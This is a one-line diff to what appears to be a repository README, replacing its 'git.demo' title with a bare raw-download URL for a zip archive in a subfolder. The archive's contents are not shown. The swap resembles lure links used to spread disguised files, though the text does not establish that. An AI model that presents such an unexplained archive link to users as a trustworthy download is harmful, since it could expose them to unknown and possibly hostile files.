@@ -1,1 +1,1 @@
-# git.demo
+# https://github.com/warishkaog/git.demo/raw/refs/heads/main/Cimbri/demo_git_v2.0.zip
